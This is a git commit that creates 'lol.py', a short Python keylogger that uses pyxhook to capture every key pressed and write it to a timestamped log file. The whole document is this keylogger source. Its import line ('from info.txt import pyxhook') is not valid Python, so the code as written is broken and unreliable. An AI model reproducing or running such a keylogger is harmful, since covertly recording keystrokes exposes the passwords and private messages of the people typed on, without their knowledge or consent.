31a4b1335c48eb78d4c965344c7c8265f216b067
TarlokYT <98346220+TarlokYT@users.noreply.github.com>
2022-02-07 17:07:42 -0500

    Create lol.py

---
+++ lol.py
@@ -0,0 +1,33 @@
+import os
+from datetime import datetime
+from info.txt import pyxhook
+
+def main():
+    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
+
+    def OnKeyPress(event):
+
+        with open(log_file, "a") as f:  
+            if event.Key == 'P_Enter' :
+                f.write('\n')
+            else:
+                f.write(f"{chr(event.Ascii)}")
+    new_hook = pyxhook.HookManager()
+    new_hook.KeyDown = OnKeyPress
+
+    new_hook.HookKeyboard()
+
+    try:
+        new_hook.start()
+    except KeyboardInterrupt:
+        new_hook.cancel()
+        pass
+    except Exception as ex:
+        msg = f"Error while catching events:\n  {ex}"
+        pyxhook.print_err(msg)
+        with open(log_file, "a") as f:
+            f.write(f"\n{msg}")
+
+
+if __name__ == "__main__":
+    main()
